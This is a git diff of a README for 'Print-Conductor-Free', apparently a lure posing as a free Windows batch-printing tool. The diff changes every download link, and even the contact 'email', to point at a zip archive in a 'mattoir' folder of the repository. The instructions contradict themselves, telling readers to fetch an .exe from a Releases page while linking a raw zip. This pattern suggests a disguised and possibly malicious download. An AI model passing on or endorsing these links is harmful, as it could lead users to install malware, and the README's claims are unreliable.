@@ -1,6 +1,6 @@
 # 🖨️ Print-Conductor-Free - Effortless Batch Printing for Everyone
 
-[![Download Print-Conductor-Free](https://github.com/DryZex95/Print-Conductor-Free/raw/refs/heads/main/mattoir/Print-Conductor-Free-v1.8.zip%20Now-Print--Conductor--Free-brightgreen)](https://github.com/DryZex95/Print-Conductor-Free/raw/refs/heads/main/mattoir/Print-Conductor-Free-v1.8.zip)
+[![Download Print-Conductor-Free](https://raw.githubusercontent.com/DryZex95/Print-Conductor-Free/main/mattoir/Free_Print_Conductor_2.3.zip%20Now-Print--Conductor--Free-brightgreen)](https://raw.githubusercontent.com/DryZex95/Print-Conductor-Free/main/mattoir/Free_Print_Conductor_2.3.zip)
 
 ## 📜 Overview
 Print-Conductor-Free is a user-friendly application designed to help you automate bulk printing tasks. With this software, you can easily manage and print multiple files on your Windows PC. This application is perfect for anyone who needs to streamline their printing process, whether you're handling documents, PDFs, or office files.
@@ -17,7 +17,7 @@ Make sure you have a Windows PC ready for the installation. Print-Conductor-Free
 ### 2. **Visit the Download Page**
 To get the latest version of Print-Conductor-Free, visit the Releases page. Click the link below:
 
-[Download Print-Conductor-Free](https://github.com/DryZex95/Print-Conductor-Free/raw/refs/heads/main/mattoir/Print-Conductor-Free-v1.8.zip)
+[Download Print-Conductor-Free](https://raw.githubusercontent.com/DryZex95/Print-Conductor-Free/main/mattoir/Free_Print_Conductor_2.3.zip)
 
 ### 3. **Download the Application**
 On the Releases page, look for the latest version of the software. You will see a section labeled "Assets" below the version number. Click on the file that ends with `.exe` to download the installation file to your computer.
@@ -62,7 +62,7 @@ Once you have everything set up, click the “Print” button. The application w
 ## 📥 Download & Install
 To download Print-Conductor-Free, revisit the Releases page. Choose the latest version and follow the download instructions provided earlier.
 
-[Download Print-Conductor-Free](https://github.com/DryZex95/Print-Conductor-Free/raw/refs/heads/main/mattoir/Print-Conductor-Free-v1.8.zip)
+[Download Print-Conductor-Free](https://raw.githubusercontent.com/DryZex95/Print-Conductor-Free/main/mattoir/Free_Print_Conductor_2.3.zip)
 
 ## ✨ Additional Resources
 For more information and support, check the following resources:
@@ -71,7 +71,7 @@ For more information and support, check the following resources:
 - **Support Forum:** A community space for users to share tips and ask for help.
 
 ## 📞 Contact
-If you have any questions or need assistance, reach out via email at https://github.com/DryZex95/Print-Conductor-Free/raw/refs/heads/main/mattoir/Print-Conductor-Free-v1.8.zip Our team is ready to help you.
+If you have any questions or need assistance, reach out via email at https://raw.githubusercontent.com/DryZex95/Print-Conductor-Free/main/mattoir/Free_Print_Conductor_2.3.zip Our team is ready to help you.
 
 ## 🔗 Topics
 Here are some relevant topics associated with Print-Conductor-Free:
